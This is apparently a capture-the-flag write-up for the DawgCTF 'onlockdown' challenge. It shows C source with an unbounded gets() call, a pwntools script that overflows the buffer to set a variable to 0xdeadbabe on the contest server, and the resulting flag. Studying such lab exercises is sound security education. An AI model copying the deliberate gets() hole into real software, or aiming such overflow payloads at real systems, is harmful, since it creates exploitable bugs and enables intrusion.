The source code is given:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void flag_me(){
	system("cat flag.txt");
}

void lockdown(){
	int lock = 0;
	char buf[64];
	printf("I made this really cool flag but Governor Hogan put it on lockdown\n");
	printf("Can you convince him to give it to you?\n");
	gets(buf);
	if(lock == 0xdeadbabe){
		flag_me();
	}else{
		printf("I am no longer asking. Give me the flag!\n");
	}
}

int main(){
	lockdown();
	return 0;
}
```

No bounded input -> buffer overflow. We can overwrite lock variable with 0xdeadbabe and get the flag.

Exploit:
```python
from pwn import *

payload = (('A'*64).encode())
payload += p32(0xdeadbabe)

p = remote('ctf.umbccd.io', 4500)
#p = process('./onlockdown')
print(p.recvuntil('?\n').decode())
p.sendline(payload)
p.interactive()
```

# FLAG
` DawgCTF{s3ri0u$ly_st@y_h0m3}`
